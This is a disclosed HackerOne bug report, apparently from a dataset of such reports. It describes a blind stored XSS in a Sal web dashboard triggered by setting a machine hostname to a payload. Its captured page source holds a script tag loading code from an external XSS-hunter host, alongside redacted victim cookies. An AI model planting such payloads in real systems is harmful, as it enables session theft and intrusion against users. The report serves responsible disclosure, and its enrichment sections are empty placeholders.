---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '995995'
original_report_id: '995995'
title: Blind Stored XSS in HackerOne's Sal 4.1.4.2149 (sal.████.com)
weakness: Cross-site Scripting (XSS) - Stored
team_handle: security
created_at: '2020-10-01T16:26:10.499Z'
disclosed_at: '2020-11-09T18:33:11.954Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 79
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Blind Stored XSS in HackerOne's Sal 4.1.4.2149 (sal.████.com)

## Metadata

- HackerOne Report ID: 995995
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: security
- Disclosed At: 2020-11-09T18:33:11.954Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The page located at `https://sal.██████.com/list/Activity/hour/all/0/` suffers from a Cross-site Scripting (XSS) vulnerability when a user has set their hostname on their machine to an XSS payload. 

##### Vulnerable Page
`https://sal.██████.com/list/Activity/hour/all/0/`

##### Victim IP Address
`███████`

##### Referer
`https://sal.██████.com/`

##### User Agent
`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36`

##### Cookies (Non-HTTPOnly)
`_ga=████████; _mkto_trk=id:███&token:_mch-█████.com-██████; _biz_uid=████████; _biz_nA=2; _biz_flagsA=%7B%22Version%22%3A1%2C%22Mkto%22%3A%221%22%7D; _biz_pendingA=%5B%5D; csrftoken=█████`

#### Source

```
><td><a href="/machine_detail/28/">███</a></td><td>██████████</td><td class="sorting_1">2020-10-01 06:51 BST</td></tr><tr role="row" class="odd"><td><a href="/machine_detail/17/">███████</a></td><td>██████</td><td class="sorting_1">2020-10-01 06:50 BST</td></tr><tr role="row" class="even"><td><a href="/machine_detail/41/">"&gt;<script src="https://nahamsec.xss.ht"></script></a></td><td>bensdp</td><td class="sorting_1">2020-10-01 06:49 BST</td></tr></tbody></table></div></div><div class="row"><div class="col-sm-5"><div class="dataTables_info" id="test_info" role="status" aria-live="polite">██████</div></div><div class="col-sm-7">
```


Thanks,
Ben

## Impact

#

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
